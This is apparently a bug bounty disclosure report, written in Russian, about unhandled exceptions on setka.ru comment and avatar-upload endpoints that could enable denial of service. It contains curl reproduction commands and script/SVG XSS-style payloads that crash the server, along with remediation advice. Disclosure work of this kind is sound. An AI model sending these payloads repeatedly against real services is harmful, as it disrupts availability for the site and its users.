# Report 04: DoS через необработанные исключения

---
**Поля формы:**

- **Название:** Denial of Service через необработанные исключения в комментариях и загрузках
- **Уровень опасности:** Средний
- **CWE:** CWE-755 (Improper Handling of Exceptional Conditions)
- **CVE:** (не указывать)
- **Скоуп:** setka.ru

---

## Где обнаружено

- `POST https://setka.ru/posts/{post_id}/comments`
- `PUT https://setka.ru/users/settings/personal-data/avatar`

## Описание уязвимости

Несколько endpoints вызывают **необработанные исключения** (HTTP 500) при получении HTML/SVG/JavaScript содержимого. Сервер (FastAPI) не обрабатывает исключения корректно, что позволяет атакующему целенаправленно вызывать crash:
1. **Worker thread падает** при обработке запроса
2. **Cascading failure** при массовой отправке
3. **Log exhaustion** — заполнение дискового пространства error logs

## Шаги воспроизведения

### 1. Crash через комментарий с HTML

```bash
curl -X POST \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}' \
  "https://setka.ru/posts/{post_id}/comments"
```
→ `500 Internal Server Error`

### 2. Crash через SVG upload

```bash
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "file=@malicious.svg;type=image/svg+xml" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `500 Internal Server Error`

malicious.svg:
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"><script>alert('xss')</script></svg>
```

### 3. Crash через HTML upload

```bash
echo '<html><body><script>alert(1)</script></body></html>' > test.html
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "file=@test.html;type=text/html" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `500 Internal Server Error`

## Влияние на безопасность

1. **Denial of Service:** Многократная отправка перегружает пул обработчиков.
2. **Cascading failure:** Worker threads, обрабатывающие эти запросы, падают и не возвращаются в пул.
3. **Log Pollution:** Error logs заполняют дисковое пространство.

**Рекомендации:** Input sanitization (очистка HTML-тегов), file type validation (magic bytes), exception handling (generic error, без stack traces), rate limiting.

## Дополнительные ссылки

- CWE-755: https://cwe.mitre.org/data/definitions/755.html
- CWE-20: https://cwe.mitre.org/data/definitions/20.html
